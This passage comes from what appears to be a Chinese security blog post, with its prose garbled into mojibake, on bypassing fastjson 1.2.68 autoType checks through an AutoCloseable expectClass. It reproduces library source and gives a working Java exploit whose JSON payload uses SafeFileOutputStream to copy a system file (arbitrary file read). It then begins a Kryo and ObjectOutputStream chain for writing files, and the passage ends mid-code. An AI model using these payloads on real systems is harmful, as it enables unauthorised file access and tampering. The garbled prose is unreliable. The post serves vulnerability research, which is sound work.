ä¸ºè¿™é‡ŒexpectClassä¸ºAutoCloseableç±»ã€å› æ­¤æ¶æ„ç±»å¿…é¡»æ˜¯AutoCloseableç±»çš„å­ç±»æ‰èƒ½é€šè¿‡è¿™é‡Œçš„åˆ¤æ–­</strong>ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280030610.png" alt="image-20230828003010006"><br><code>checkAutoType()</code>è°ƒç”¨å®Œè¿”å›ç±»ä¹‹åï¼Œå°±è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€æ–°å»ºæ¶æ„ç±»å®ä¾‹è¿›è€Œè°ƒç”¨å…¶æ„é€ å‡½æ•°ä»è€ŒæˆåŠŸè§¦å‘æ¼æ´ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280030655.png" alt="image-20230828003031002"><br>å°ç»“ï¼š<br>ç¬¬ä¸€ä¸ª <code>@type</code> æ˜¯ä½œä¸ºç¬¬äºŒä¸ªæŒ‡å®šçš„ç±»é‡Œé¢çš„ expectClassï¼Œå¹¶ä¸”éœ€è¦åŠ è½½çš„ç›®æ ‡ç±»æ˜¯expectClassç±»çš„å­ç±»æˆ–è€…å®ç°ç±»è¿™å°±æ˜¯æ„é€ æ¶æ„ç±»ä¸ºä»€ä¹ˆVulAutoCloseable(ç»§æ‰¿æˆ–è€…)å®ç°AutoCloseableç±» ï¼ˆä¸åœ¨é»‘åå•ä¸­ï¼‰ï¼Œå½“ä¼ å…¥<code>checkAutoType()</code>å‡½æ•°çš„expectClasså‚æ•°ä¸ä¸ºnullï¼Œå¹¶ä¸”éœ€è¦åŠ è½½çš„ç›®æ ‡ç±»æ˜¯expectClassç±»çš„å­ç±»æˆ–è€…å®ç°ç±»æ—¶ï¼ˆä¸åœ¨é»‘åå•ä¸­ï¼‰ï¼Œå°±å°†éœ€è¦åŠ è½½çš„ç›®æ ‡ç±»å½“åšæ˜¯æ­£å¸¸çš„ç±»ç„¶åé€šè¿‡è°ƒç”¨<code>TypeUtils.loadClass()</code>å‡½æ•°è¿›è¡ŒåŠ è½½ã€‚</p><h3 id="å®é™…åˆ©ç”¨"><a href="#å®é™…åˆ©ç”¨" class="headerlink" title="å®é™…åˆ©ç”¨"></a>å®é™…åˆ©ç”¨</h3><p>è¿™é‡Œå°±æ˜¯æ‰¾ä¸€ä¸‹å®é™…ä¸­å¯åˆ©ç”¨çš„ç±»ï¼Œå› ä¸ºä¸Šé¢æ˜¯è‡ªå·±æ„é€ çš„éªŒè¯ä¸€ä¸‹å¯è¡Œæ€§<br>å¯»æ‰¾å…³äºè¾“å…¥è¾“å‡ºæµçš„ç±»æ¥å†™æ–‡ä»¶ï¼ŒIntputStreamå’ŒOutputStreaméƒ½æ˜¯å®ç°äº†AutoCloseableæ¥å£çš„ã€‚<br>å¤§ä½¬å¯»æ‰¾ gadget æ—¶çš„æ¡ä»¶æ˜¯è¿™æ ·çš„ã€‚</p><ul><li>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•æŒ‡å®šæ–‡ä»¶è·¯å¾„çš„ OutputStream</li><li>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥å­—èŠ‚æ•°æ®çš„ OutputStreamï¼Œå‚æ•°ç±»å‹å¿…é¡»æ˜¯byte<code>[]</code>ã€ByteBufferã€Stringã€char<code>[]</code>å…¶ä¸­çš„ä¸€ä¸ªï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œæœ€åå¯ä»¥é€šè¿‡ write æ–¹æ³•å°†ä¼ å…¥çš„å­—èŠ‚ç  write åˆ°ä¼ å…¥çš„ OutputStream</li><li>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è°ƒç”¨ toStringã€hashCodeã€getã€setã€æ„é€ æ–¹æ³• è°ƒç”¨ä¼ å…¥çš„ OutputStream çš„ closeã€write æˆ– flush æ–¹æ³•<br>ä»¥ä¸Šä¸‰ä¸ªç»„åˆåœ¨ä¸€èµ·å°±èƒ½æ„é€ æˆä¸€ä¸ªå†™æ–‡ä»¶çš„åˆ©ç”¨é“¾ï¼Œæˆ‘é€šè¿‡æ‰«æäº†ä¸€ä¸‹ JDK ï¼Œæ‰¾åˆ°äº†ç¬¦åˆç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ¡ä»¶çš„ç±»ã€‚<br>åˆ†åˆ«æ˜¯ FileOutputStream å’Œ ObjectOutputStreamï¼Œä½†è¿™ä¸¤ä¸ªç±»é€‰å–çš„æ„é€ å™¨ï¼Œä¸ç¬¦åˆæƒ…å†µï¼Œæ‰€ä»¥åªèƒ½æ‰¾åˆ°è¿™ä¸¤ä¸ªç±»çš„å­ç±»ï¼Œæˆ–è€…åŠŸèƒ½ç›¸åŒçš„ç±»ã€‚</li></ul><h4 id="å¤åˆ¶æ–‡ä»¶ï¼ˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼‰"><a href="#å¤åˆ¶æ–‡ä»¶ï¼ˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼‰" class="headerlink" title="å¤åˆ¶æ–‡ä»¶ï¼ˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼‰"></a>å¤åˆ¶æ–‡ä»¶ï¼ˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼‰</h4><p>åˆ©ç”¨ç±»ï¼š<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong><br>ä¾èµ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸‹SafeFileOutputStreamç±»çš„æºç ï¼Œå…¶<code>SafeFileOutputStream(java.lang.String, java.lang.String)</code>æ„é€ å‡½æ•°åˆ¤æ–­äº†å¦‚æœtargetPathæ–‡ä»¶ä¸å­˜åœ¨ä¸”tempPathæ–‡ä»¶å­˜åœ¨ï¼Œå°±ä¼šæŠŠtempPathå¤åˆ¶åˆ°targetPathä¸­ï¼Œæ­£æ˜¯åˆ©ç”¨å…¶æ„é€ å‡½æ•°çš„è¿™ä¸ªç‰¹ç‚¹æ¥å®ç°Webåœºæ™¯ä¸‹çš„ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeFileOutputStream</span> <span class="keyword">extends</span> <span class="title class_">OutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> File temp;</span><br><span class="line">    <span class="keyword">protected</span> File target;</span><br><span class="line">    <span class="keyword">protected</span> OutputStream output;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> failed;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXTENSION</span> <span class="operator">=</span> <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>(file.getAbsolutePath(), (String)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// è¯¥æ„é€ å‡½æ•°åˆ¤æ–­å¦‚æœtargetPathæ–‡ä»¶ä¸å­˜åœ¨ä¸”tempPathæ–‡ä»¶å­˜åœ¨ï¼Œå°±ä¼šæŠŠtempPathå¤åˆ¶åˆ°targetPathä¸­</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(String targetPath, String tempPath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.failed = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.target = <span class="keyword">new</span> <span class="title class_">File</span>(targetPath);</span><br><span class="line">        <span class="built_in">this</span>.createTempFile(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.target.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.target));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.temp));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.failed) &#123;</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.commit();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.target.delete();</span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(File sourceFile, File destinationFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (sourceFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!sourceFile.renameTo(destinationFile)) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">source</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">BufferedOutputStream</span> <span class="variable">destination</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    source = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(sourceFile));</span><br><span class="line">                    destination = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destinationFile));</span><br><span class="line">                    <span class="built_in">this</span>.transferStreams(source, destination);</span><br><span class="line">                    destination.close();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    FileUtil.safeClose(source);</span><br><span class="line">                    FileUtil.safeClose(destination);</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createTempFile</span><span class="params">(String tempPath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempPath == <span class="literal">null</span>) &#123;</span><br><span class="line">            tempPath = <span class="built_in">this</span>.target.getAbsolutePath() + <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">this</span>.temp = <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTempFilePath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.temp.getAbsolutePath();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">transferStreams</span><span class="params">(InputStream source, OutputStream destination)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> source.read(buffer);</span><br><span class="line">            <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            destination.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.write(b);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expå¦‚ä¸‹ï¼Œè¿™é‡Œä¸å¾—ä¸è¯´ä¾èµ–å¯¼çš„çœŸæ…¢ï¼Œæˆ‘ä¸‹è½½åœ°å€éƒ½æ¢æˆäº†å›½å†…çš„äº†è¿˜è¿™ä¹ˆæ…¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.localstore.SafeFileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280030079.png" alt="image-20230828003050698"><br>è¿™é‡ŒæˆåŠŸè‡ªåŠ¨ç”Ÿæˆäº†flag.txtå¹¶ä¸”æŠŠwin.iniå¤åˆ¶äº†ä¸‹æ¥</p><h4 id="å†™å…¥æ–‡ä»¶"><a href="#å†™å…¥æ–‡ä»¶" class="headerlink" title="å†™å…¥æ–‡ä»¶"></a>å†™å…¥æ–‡ä»¶</h4><p>å†™å†…å®¹ç±»ï¼š<strong>com.esotericsoftware.kryo.io.Output</strong><br>ä¾èµ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>Outputç±»ä¸»è¦ç”¨æ¥å†™å†…å®¹ï¼Œå®ƒæä¾›äº†<code>setBuffer()</code>å’Œ<code>setOutputStream()</code>ä¸¤ä¸ªsetteræ–¹æ³•å¯ä»¥ç”¨æ¥å†™å…¥è¾“å…¥æµï¼Œå…¶ä¸­bufferå‚æ•°å€¼æ˜¯æ–‡ä»¶å†…å®¹ï¼ŒoutputStreamå‚æ•°å€¼å°±æ˜¯å‰é¢çš„SafeFileOutputStreamç±»å¯¹è±¡ï¼Œè€Œè¦è§¦å‘å†™æ–‡ä»¶æ“ä½œåˆ™éœ€è¦è°ƒç”¨å…¶<code>flush()</code>å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outputStream May be null. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setOutputStream</span> <span class="params">(OutputStream outputStream)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.outputStream = outputStream;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">    total = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Sets the buffer that will be written to. &#123;<span class="doctag">@link</span> #setBuffer(byte[], int)&#125; is called with the specified buffer&#x27;s length as the</span></span><br><span class="line"><span class="comment"> * maxBufferSize. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBuffer</span> <span class="params">(<span class="type">byte</span>[] buffer)</span> &#123;</span><br><span class="line">    setBuffer(buffer, buffer.length);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Writes the buffered bytes to the underlying OutputStream, if any. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span> <span class="params">()</span> <span class="keyword">throws</span> KryoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (outputStream == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        outputStream.write(buffer, <span class="number">0</span>, position);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KryoException</span>(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    total += position;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>æ¥ç€ï¼Œå°±æ˜¯è¦çœ‹æ€ä¹ˆè§¦å‘Outputç±»<code>flush()</code>å‡½æ•°äº†ï¼Œ<code>flush()</code>å‡½æ•°åªæœ‰åœ¨<code>close()</code>å’Œ<code>require()</code>å‡½æ•°è¢«è°ƒç”¨æ—¶æ‰ä¼šè§¦å‘ï¼Œå…¶ä¸­<code>require()</code>å‡½æ•°åœ¨è°ƒç”¨writeç›¸å…³å‡½æ•°æ—¶ä¼šè¢«è§¦å‘ã€‚<br>å…¶ä¸­ï¼Œæ‰¾åˆ°JDKçš„ObjectOutputStreamç±»ï¼Œå…¶å†…éƒ¨ç±»BlockDataOutputStreamçš„æ„é€ å‡½æ•°ä¸­å°†OutputStreamç±»å‹å‚æ•°èµ‹å€¼ç»™outæˆå‘˜å˜é‡ï¼Œè€Œå…¶<code>setBlockDataMode()</code>å‡½æ•°ä¸­è°ƒç”¨äº†<code>drain()</code>å‡½æ•°ã€<code>drain()</code>å‡½æ•°ä¸­åˆè°ƒç”¨äº†<code>out.write()</code>å‡½æ•°ï¼Œæ»¡è¶³å‰é¢çš„éœ€æ±‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Creates new BlockDataOutputStream on top of given underlying stream.  </span></span><br><span class="line"><span class="comment"> * Block data mode is turned off by default.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> BlockDataOutputStream(OutputStream out) &#123;  </span><br><span class="line"> <span class="built_in">this</span>.out = out;  </span><br><span class="line"> dout = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="built_in">this</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Sets block data mode to the given mode (true == on, false == off)  </span></span><br><span class="line"><span class="comment"> * and returns the previous mode value.  If the new mode is the same as  </span></span><br><span class="line"><span class="comment"> * the old mode, no action is taken.  If the new mode differs from the  </span></span><br><span class="line"><span class="comment"> * old mode, any buffered data is flushed before switching to the new  </span></span><br><span class="line"><span class="comment"> * mode.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode == mode) &#123;  </span><br><span class="line"> <span class="keyword">return</span> blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line"> drain();  </span><br><span class="line"> blkmode = mode;  </span><br><span class="line"> <span class="keyword">return</span> !blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">...  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Writes all buffered data from this stream to the underlying stream,  </span></span><br><span class="line"><span class="comment"> * but does not flush underlying stream.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;  </span><br><span class="line"> <span class="keyword">return</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode) &#123;  </span><br><span class="line"> writeBlockHeader(pos);  </span><br><span class="line"> &#125;  </span><br><span class="line"> out.write(buf, <span class="number">0</span>, pos);  </span><br><span class="line"> pos = <span class="number">0</span>;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºsetBlockDataMode()å‡½æ•°çš„è°ƒç”¨ï¼Œåœ¨ObjectOutputStreamç±»çš„æœ‰å‚æ„é€ å‡½æ•°ä¸­å°±å­˜åœ¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span 